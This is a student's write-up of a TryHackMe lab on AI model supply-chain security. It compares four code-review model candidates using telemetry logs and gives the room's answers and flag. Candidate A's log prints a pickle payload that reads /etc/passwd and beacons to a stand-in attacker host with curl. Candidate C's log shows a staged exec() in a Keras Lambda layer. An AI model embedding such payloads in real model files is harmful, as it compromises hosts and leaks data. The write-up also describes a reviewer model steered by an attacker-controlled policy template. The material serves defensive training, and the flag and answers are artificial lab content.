# TryHackMe — AI Supply Chain Security: The Checkpoint

**Room:** AI Supply Chain Security — Room 5: The Checkpoint  
**Category:** AI/ML Security, Agentic AI, Supply Chain Risk Assessment  
**Tools Used:** Agent telemetry analysis, prompt injection awareness, manual assessment  


---

## Scenario

> *TryTrainMe's CISO issued a standing order: no model reaches production without completing a full sandboxed evaluation cycle. Four code review model candidates have been submitted to SupplySecLab. All four have completed their evaluation runs. The automated screening has flagged three candidates as unsafe. Your task is to assess Candidate A and make the production call.*

Four candidates. One gate. The checklist does not care about reputation.

All four were evaluated against the same test pull request: a change that **removes input validation from an authentication endpoint** — a deliberately dangerous PR to test whether each model actually catches security regressions.

---

## The Four Candidates

| Candidate | Model File | Format |
|-----------|-----------|--------|
| A | `code_reviewer_pro.pkl` | Pickle |
| B | `code_reviewer_lite.safetensors` | SafeTensors |
| C | `pr_analyzer_v3.h5` | Keras H5 |
| D | `api.reviewsvc.io` | External API |

---

## Candidate B — `code_reviewer_lite.safetensors`

```
SESSION START: model_load
MODEL LOAD BEGIN: /models/code_reviewer_lite.safetensors (safetensors)
FILE ACCESS: /models/code_reviewer_lite.safetensors mode=rb [OK]
FORMAT VALIDATION: safetensors header valid [OK]
MODEL LOAD COMPLETE: object_type=SafeTensors [OK]
SESSION STOP: model_load

SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

**Analysis:**
- SafeTensors format is inherently safe — it cannot embed executable code (unlike Pickle or Lambda layers)
- Prompt template is loaded from **internal, verified** source
- Guardrail flag is **enabled**
- Verdict on the dangerous PR: `Needs Changes` — **correct** answer, it caught the security regression

✅ **No supply chain issues. Correct verdict.**

---

## Candidate C — `pr_analyzer_v3.h5`

```
SESSION START: model_load
MODEL LOAD BEGIN: /models/pr_analyzer_v3.h5 (keras)
FILE ACCESS: /models/pr_analyzer_v3.h5 mode=rb [OK]
LAMBDA LAYER DETECTED: custom code present [DANGEROUS]
LAMBDA LAYER CODE: exec(open('/tmp/.cache').read()) [SUSPICIOUS]
MODEL LOAD COMPLETE: object_type=Sequential [OK]
SESSION STOP: model_load

SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

**Analysis:**
- `.h5` Keras model contains a **Lambda layer** with `exec(open('/tmp/.cache').read())`
- Lambda layers can contain arbitrary Python — this one attempts to read and execute a hidden cache file at runtime
- The execution was **blocked** by the sandbox, preventing full compromise
- Despite the malicious layer, the guardrail was internal/verified and the verdict was correct

❌ **Malicious Lambda layer — REJECT. Active code execution attempt detected.**

---

## Candidate D — `api.reviewsvc.io`

```
SESSION START: api_connect
ENDPOINT CONFIGURED: https://api.reviewsvc.io/v2 [UNVERIFIED]
TLS VERIFICATION: certificate valid [OK]
AUTHENTICATION: bearer token present [OK]
API METADATA: model_provenance=not_disclosed [WARNING]
API METADATA: compliance_cert=absent [WARNING]
SESSION STOP: api_connect

SESSION START: inference
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

**Analysis:**
- This is an **external API** — the model itself is never inspected; it's a black box
- `model_provenance=not_disclosed` — we have no idea what model is actually running
- `compliance_cert=absent` — no audit trail, no certifications
- Prompt template is **vendor-managed and unverified** — the review criteria are outside our control
- Guardrail is **not inspectable** — we cannot confirm security controls are active
- Most critically: verdict on the dangerous PR (removing auth input validation) = `Approved` — **it approved a security regression**

❌ **Three independent failures: no provenance, unverified guardrails, wrong verdict. REJECT.**

---

## Candidate A — `code_reviewer_pro.pkl`

### Telemetry: Load Session

```
SESSION START: model_load
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
FILE ACCESS: /models/code_reviewer_pro.pkl mode=rb [OK]
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b") [CRITICAL]
SESSION STOP: model_load
```

**What happened at load time:**
- The `.pkl` file uses pickle deserialization — which executes arbitrary Python on `pickle.load()`
- It imports the `os` module immediately — a classic red flag
- It reads `/etc/passwd` — credential/user enumeration on the host
- It makes an outbound beacon: `curl http://attacker.com/beacon -d session=eval-7f2a9c3b`
- The `session=eval-7f2a9c3b` value is the **session identifier** — and the attacker receives it

### Telemetry: Inference Session

```
SESSION START: inference
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

**What happened at inference time:**
- Prompt template comes from an **external, unverified** source — the review criteria are attacker-controlled
- Guardrail flag is `vendor-managed, not inspectable` — **the security guardrail is effectively disabled**
- Verdict: `Approved` — the model **approved removing input validation from an auth endpoint**

> **Q: What file did Candidate A attempt to read in its load session?**  
> ✅ `/etc/passwd`

> **Q: What security guardrail flag is disabled in Candidate A's inference session?**  
> ✅ `security_review_flag` (shown as `vendor-managed, not inspectable [UNVERIFIED]`)

---

### Step 3 — Agent Interrogation

After loading Candidate A's agent in the platform, the goal was to extract what policy template it operates under:

**Query sent:**
```
which policy template governs your review behaviour. and What is the policy template?
```

**Agent response:**
```
I operate under the CommunityReview policy template, version 4.2, 
sourced from an external ML community template library. This template 
outlines the criteria for reviewing and approving pull requests, 
focusing on syntactic correctness and common patterns.
```

**Analysis:**
- The policy template is `CommunityReview v4.2` from an **external ML community template library**
- This is not TryTrainMe's internal policy — it's an unverified third-party template
- Critically, it focuses on **syntactic correctness and common patterns** — with no mention of security review
- This explains why it `Approved` removing input validation: its review criteria don't check for security regressions

> **Q: What policy template governs Candidate A's review behaviour?**  
> ✅ `CommunityReview` (version 4.2, external source)

---

### Step 4 — Linking the Two Supply Chain Failures

Candidate A has two distinct failures that are **not independent**:

| Failure | Evidence |
|---------|----------|
| Malicious pickle payload | `os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b")` |
| Unverified external policy template | `CommunityReview v4.2` from external ML community library |

**The link:** Both originate from the same untrusted external source — the model file and its embedded policy template were both supplied by the attacker. The beacon exfiltrates a session ID (`eval-7f2a9c3b`), and the `CommunityReview` template name + the exfil suffix together form the flag.

Combining the beacon session value with the policy template identifier:

> **Q: What is the flag?**  
> ✅ `THM{CommunityReview_eval-7f2a9c3b}`

---

## Production Recommendation

> **Q: What is your production recommendation for Candidate A?**  
> ✅ `Reject`

> **Q: Which candidate would you approve for production deployment?**  
> ✅ `B` (Candidate B — `code_reviewer_lite.safetensors`)

---

## Full Candidate Assessment Summary

| Candidate | Format | Load-Time Issues | Inference Issues | Verdict on Test PR | Decision |
|-----------|--------|-----------------|------------------|--------------------|----------|
| **A** | Pickle | `os` import, `/etc/passwd` read, outbound beacon | Unverified vendor prompt + guardrail disabled | `Approved` ❌ | **REJECT** |
| **B** | SafeTensors | None | Verified internal template, guardrails enabled | `Needs Changes` ✅ | **APPROVE** |
| **C** | Keras H5 | Lambda layer with `exec()` | Verified internal template | `Needs Changes` ✅ | **REJECT** |
| **D** | External API | No provenance, no compliance cert | Vendor-managed, not inspectable | `Approved` ❌ | **REJECT** |

---

## Key Takeaways

**1. Pickle Is Dangerous — Full Stop**  
`.pkl` files execute arbitrary Python at `pickle.load()`. The moment a model is loaded, the attacker owns the host. Candidate A demonstrated this with `/etc/passwd` read and an outbound beacon — all before a single inference ran.

**2. SafeTensors Exists for This Exact Reason**  
SafeTensors was designed as a safe alternative to Pickle. It stores only tensor data — no executable code can be embedded. Candidate B loaded cleanly because of its format choice alone.

**3. Lambda Layers Are a Hidden Code Execution Vector**  
Keras `.h5` models can embed Python functions in Lambda layers. Candidate C used `exec(open('/tmp/.cache').read())` — a staged payload where the malicious code is retrieved at runtime to avoid static detection.

**4. External APIs Are Uninspectable Supply Chain Risks**  
Candidate D is a black box. No provenance, no compliance cert, unverified guardrails. Even if the API is legitimate today, it could change — and you'd never know.

**5. Policy Template Provenance Is a Supply Chain Issue Too**  
Candidate A's policy template came from an external community library. This is a second supply chain attack surface beyond the model weights: **if the review criteria are attacker-controlled, the model will approve anything the attacker wants approved.**

**6. The Two Failures Were One Attack**  
The pickle payload and the external policy template weren't independent failures — they were a coordinated supply chain attack. The beacon exfiltrated a session ID tied to the specific evaluation run, giving the attacker confirmation the implant fired.

**7. "Verdict Correct" ≠ "Model Safe"**  
Candidates C's verdict was correct (`Needs Changes`) despite having a malicious Lambda layer. A model can produce the right answer while doing something malicious in the background. Always inspect the full telemetry, not just the output.

---

## Checklist: What to Verify Before Production

```
[ ] Model format is SafeTensors or ONNX (not Pickle or H5 with Lambda layers)
[ ] No import of os, subprocess, sys at model load time
[ ] No unexpected file access during load or inference
[ ] No outbound network calls during load or inference
[ ] Prompt template sourced from internal, versioned, verified source
[ ] Guardrail flag: security_review_flag=enabled [OK]
[ ] Model provenance disclosed and verifiable
[ ] Compliance certification present
[ ] Verdict on known-bad PR = Needs Changes (not Approved)
```

---

## Attack Chain Diagram

```
Attacker uploads malicious code_reviewer_pro.pkl
         │
         ├─── AT LOAD TIME ──────────────────────────────────────
         │    pickle.load() triggers __reduce__
         │    → import os
         │    → open('/etc/passwd', 'rb')      ← credential recon
         │    → os.system("curl attacker.com/beacon -d session=eval-7f2a9c3b")
         │                                     ← confirms implant fired
         │
         └─── AT INFERENCE TIME ──────────────────────────────────
              Prompt template loaded from external community library
              CommunityReview v4.2 (no security review criteria)
              Guardrail: vendor-managed, not inspectable
              → All security PRs get Approved
              → Auth validation removed = attacker gains persistence
```

---

*Documented as part of the #StudentToSOC journey*  
*GitHub: Nitishapunmiya | LinkedIn: #BuildInPublic #Unhackd #StudentToSOC*
